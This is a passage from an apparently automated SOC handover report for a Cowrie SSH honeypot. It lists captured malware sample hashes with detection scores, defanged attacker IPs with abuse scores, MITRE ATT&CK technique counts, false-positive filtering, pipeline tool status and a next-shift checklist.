| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `3.129.73[.]98` | US | Amazon Technologies Inc. | **100** ⚠️ | 2 |
| `54.91.130[.]222` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 3 |
| `167.99.119[.]225` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `3.145.168[.]146` | US | Amazon Technologies Inc. | **100** ⚠️ | 2 |
| `66.132.195[.]65` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `103.75.198[.]228` | DE | Parsun Network Solutions PTY LTD | **100** ⚠️ | 2 |
| `69.5.169[.]231` | DE | Infrawatch Limited | **100** ⚠️ | 10 |
| `115.190.27[.]28` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 24 |
| `61.171.110[.]253` | CN | CHINANET Shanghai province network | **100** ⚠️ | 15 |
| `183.220.38[.]154` | CN | China Mobile Communications Corporation | **100** ⚠️ | 6 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 191 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 112 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 54 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 24 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 24 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 8 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 242 cases |
| Tool 34  | Credential Extractor        | ✅ 166 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (3.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 22 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 54 priority case(s) shown individually · 21 recon entry/entries in table (10 group(s) consolidating 168 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-06T13:51:30Z_
